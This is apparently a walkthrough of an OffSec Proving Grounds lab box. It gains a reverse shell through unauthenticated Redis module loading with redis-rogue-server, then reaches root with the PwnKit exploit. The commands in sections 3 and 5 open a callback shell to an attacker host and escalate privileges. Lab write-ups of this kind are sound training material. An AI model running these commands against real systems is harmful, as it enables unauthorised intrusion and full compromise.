
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Linux **Service:** Redis 4.0.14 (unauthenticated, exposed) **Initial Access:** Unauthenticated Redis module-load RCE **Initial Access Type:** Service exploitation (no web application involved) **Privilege Escalation:** PwnKit (CVE-2021-4034) — SUID `pkexec` local privilege escalation **Final Access:** Root

### Key Techniques

- Full port range Nmap scan with OS detection
- Recognizing a non-HTTP response on an HTTP-style request
- HackTricks as a service-specific reference source
- Redis unauthenticated module-load RCE (`redis-rogue-server`)
- Reverse shell via a public exploit's built-in delivery
- `sudo -l` enumeration (custom command found, no viable path)
- LinPEAS kernel/version-based vulnerability discovery
- PwnKit / CVE-2021-4034

---

# Attack Path

```text
nmap -p- -sV -sC -O
        ↓
Port 6379 Open — Non-HTTP Response to HTTP Request
        ↓
Identify Service as Redis 4.0.14 via Google/HackTricks
        ↓
Unauthenticated Redis — No Credentials Required
        ↓
redis-rogue-server.py: Module-Load RCE Exploit
        ↓
Reverse Shell as prudence
        ↓
Local Flag Retrieved
        ↓
sudo -l: Custom redis-status Command (Dead End)
        ↓
LinPEAS: Kernel/Version Vulnerabilities Flagged
        ↓
PwnKit (CVE-2021-4034)
        ↓
Root Shell
```

---

# 1. Reconnaissance

```bash
export IP="<targetIP>"
export URL="http://<targetIP>"
```

```bash
sudo nmap -p- $IP -sV -sC -O -Pn --open -oN fullscan.txt
```

Full port range plus OS detection (`-O`) from the start — sensible on a box rated Hard, where the obvious surface (a single web app) may not be the actual path in.

Port **`6379`** open. Trying to access it as an HTTP service returns a response that clearly isn't HTML — a strong signal the port is speaking a completely different protocol under an unexpected guise.

> [!tip] Recognition Pattern When a port responds to an HTTP request with something that isn't valid HTML/HTTP, don't assume it's broken — it likely means the service on that port speaks an entirely different protocol. `curl`/browser output that looks like garbled binary or a terse unexpected error is worth Googling verbatim, or cross-referencing against the port number's well-known services (6379 is Redis's default port).

---

# 2. Service Identification — Redis

Searching the service banner/version string leads to a HackTricks reference page for Redis:

- [HackTricks — 6379 Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

Key fact from the reference: **Redis has no authentication by default**, unless explicitly configured with a password or protected mode.

> [!tip] Recognition Pattern HackTricks (and similar community pentesting wikis) is often the fastest path from "I've identified a service" to "here's exactly how it's commonly exploited," especially for non-HTTP services like Redis, Memcached, SNMP, and other infrastructure-layer protocols that don't get the same attention as web app vulnerabilities. Worth checking as a first stop whenever a less-common service/port shows up.

---

# 3. Exploitation — Unauthenticated Redis RCE

The specific technique: Redis supports loading dynamic modules (`.so` shared object files) at runtime via the `MODULE LOAD` command. Without authentication enforced, a remote attacker can instruct Redis to load an attacker-supplied module directly, achieving code execution as whatever user the Redis service runs under.

- Exploit used: [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) (targets Redis ≤ 5.0.5)

```bash
./redis-rogue-server.py --rhost=<target_ip> --rport=6379 --lhost=<attacker_ip> --lport=4443
```

The tool provides an interactive menu — selecting the reverse shell option and supplying attacker IP/port triggers the callback automatically.

Reverse shell received as `prudence`.

> [!tip] Key Principle Any data store or cache that supports loading executable extensions/modules (Redis modules, some database stored-procedure mechanisms, plugin-loading systems in general) is a strong RCE candidate the moment authentication isn't enforced — the "load code and run it" functionality is often intended for legitimate extensibility, but becomes a direct code-execution primitive for anyone who can reach the service unauthenticated.

---

# 4. Privilege Escalation Enumeration

```bash
cat /home/prudence/local.txt
```

Notes found in `prudence`'s home directory reference **Redis protected mode** not being implemented — protected mode (added in Redis 3.2.0) restricts Redis to only accept loopback connections when no authentication is configured, which is exactly the missing control that made the initial foothold possible.

## Checking sudo rights

```bash
sudo -l
```

Reveals a custom `redis-status` command `prudence` can run as a privileged user — however, after investigation, this didn't yield a usable exploitation path (no obvious command injection, wildcard abuse, or writable script behind it).

> [!tip] Don't Force a Dead End Not every custom sudo entry is exploitable. After reasonable investigation of the `redis-status` command turned up nothing, the walkthrough correctly pivoted to a different enumeration angle (kernel/version-based vulnerabilities) rather than continuing to force a path that wasn't there. Recognizing when to change strategy is itself a skill worth practicing — spending unlimited time on one lead isn't always the right call.

## Pivoting to kernel/version vulnerabilities

Ran **LinPEAS**, which flagged known kernel and installed-package vulnerabilities based on version fingerprinting.

---

# 5. Privilege Escalation — PwnKit (CVE-2021-4034)

LinPEAS's findings pointed toward `pkexec` being a vulnerable version, susceptible to **PwnKit** — a widely-applicable local privilege escalation in `polkit`'s `pkexec`, caused by improper handling of command-line argument count that allows environment variable injection leading to arbitrary code execution as root.

- Exploit used: [ly4k/PwnKit](https://github.com/ly4k/PwnKit)

```bash
./PwnKit
```

Root shell obtained.

> [!tip] Recognition Pattern On a box rated Hard where the "obvious" privesc path (a custom sudo command) doesn't pan out, checking LinPEAS's kernel/CVE findings — rather than continuing to dig at application-level misconfigurations — is often the right pivot. PwnKit specifically is common enough, and fast enough to try, that it's worth attempting on essentially any Linux box with an unpatched `polkit` version, independent of whatever other privesc surface exists.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|A port returns a non-HTTP response to an HTTP request|Identify the actual protocol — cross-reference the port number and response format|
|An in-memory data store / cache is exposed|Check whether authentication is enforced at all; many default to none|
|Service supports loading modules/extensions/stored procedures|Strong RCE candidate if reachable unauthenticated|
|A custom sudo command doesn't yield an obvious exploit path|Don't force it — pivot to kernel/version-based vectors (LinPEAS findings, PwnKit)|
|Box difficulty seems to exceed the complexity of the privesc found so far|Check for kernel/CVE-based paths in addition to misconfiguration-based ones|

---

# Key Lessons

> [!tip] A Non-HTTP Response Is a Clue, Not an Error When a service responds oddly to an HTTP probe, treat the odd response as identifying information rather than a failure — cross-reference it against the port number and search engines to identify the real protocol.

> [!tip] Community Wikis Are a Fast Path for Service-Specific Exploitation HackTricks-style references consolidate exploitation techniques for infrastructure services (databases, caches, message brokers) that don't get the same standalone-CVE treatment web apps do. Worth checking early whenever an unfamiliar or infrastructure-layer service is identified.

> [!tip] Unauthenticated Module/Extension Loading = RCE Any service that lets you load and execute arbitrary code as an extensibility feature is a serious risk the moment authentication is missing — this applies well beyond Redis specifically.

> [!tip] Know When to Abandon a Sudo Lead If a custom sudo-permitted command doesn't show an obvious injection or misuse path after reasonable investigation, it's fine to move on to other enumeration angles rather than exhausting all effort there.

> [!tip] PwnKit Deserves a Standing Check on Every Linux Box Fast, reliable, and requires no credentials — worth trying whenever other privesc paths stall out, and worth checking even when they don't, given how little it costs to attempt.